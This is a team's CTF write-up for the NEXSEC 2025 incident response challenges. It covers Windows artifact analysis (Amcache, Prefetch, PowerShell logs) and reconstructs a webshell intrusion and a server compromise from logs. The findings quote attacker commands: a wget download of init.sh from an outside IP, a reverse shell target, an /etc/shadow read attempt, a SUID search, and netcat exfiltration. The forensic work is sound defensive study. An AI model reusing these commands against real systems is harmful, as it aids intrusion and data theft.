# NEXSEC 2025 - Incident Response

**CTF:** NEXSEC 2025  
**Team:** BATERIAAA  
**Category:** Incident Response

---

## Here's the Dump #1

*Find the SHA1 hash of a deleted but previously executed file.*

When a file is deleted but was previously executed, the **Amcache.hve** registry hive stores metadata including SHA-1 hashes.

Used Eric Zimmerman's tools:

1. Identified user **Alina** as the best candidate for initial infection
2. Located `Amcache.hve` in the disk image
3. Extracted readable data from the registry hive to CSV
4. Analyzed `UnassociatedFileEntries.csv`, filtered for user Alina

Found suspicious file path: `c:\users\alina\downloads\a.exe` with its SHA1 hash.

---

## Here's the Dump #2

*Where was the RAT file downloaded from?*

1. Checked all user History files -- all came back empty
2. Found suspicious Prefetch file: `A.EXE-04BF3E92.pf`
3. Checked WebCache database -- no output
4. Checked PowerShell logs:

```bash
strings -el "Microsoft-Windows-PowerShell%4Operational.evtx" | grep "http"
```

Found the download URL for the RAT.

---

## Breadcrumbs #1 - #13

A web application compromise scenario. Attacker IP: `192.168.21.102`

**Attack chain reconstructed from access logs and PCAP:**

| # | Finding | Flag |
|---|---------|------|
| 1 | Attacker IP | `192.168.21.102` |
| 2 | Uploaded file | `resume_aima.pdf.php` |
| 3 | Upload timestamp | `13/DEC/2025:02:13:37 +0800` |
| 4 | First webshell command | `whoami` |
| 5 | Reverse shell target | `172.16.23.13:4444` |
| 6 | First command after shell | `cat /etc/os-release` |
| 7 | User context | `www-data` |
| 8 | Initial directory | `/var/www/html/uploads` |
| 9 | Denied file access | `/etc/shadow` |
| 10 | SUID binary search | `find / -perm -4000 -type f 2>/dev/null` |
| 11 | Persistence command | Crontab append with reverse shell every minute |
| 12 | Network enumeration | `ss -tulpn` |
| 13 | Target user directory | `/home/sysadmin` |

---

## Classic #1 - #7

A compromised server triage analysis.

**Findings:**

| # | Question | Answer |
|---|----------|--------|
| 1 | Initial access service | `ssh` |
| 2 | Attacker IP | `100.96.0.2` |
| 3 | Download command | `wget --limit-rate=1k http://192.168.8.11:8080/init.sh` |
| 4 | First affected directory | `/home/centos/data_production/` |
| 5 | Exfiltration tool | `nc` (netcat) |
| 6 | First exfiltrated file | `Nexsec2025_Operational_Maintenance_Notes.txt` |
| 7 | Transfer process PID | `9169` |

Key forensic artifacts used: `ss -anepo`, process listings, `.bash_history`, Prefetch files.

---

## Security Incident

Analyzed saved security logs.

**Flag:** `12/13/2025_12:35:23PM_webadmin`
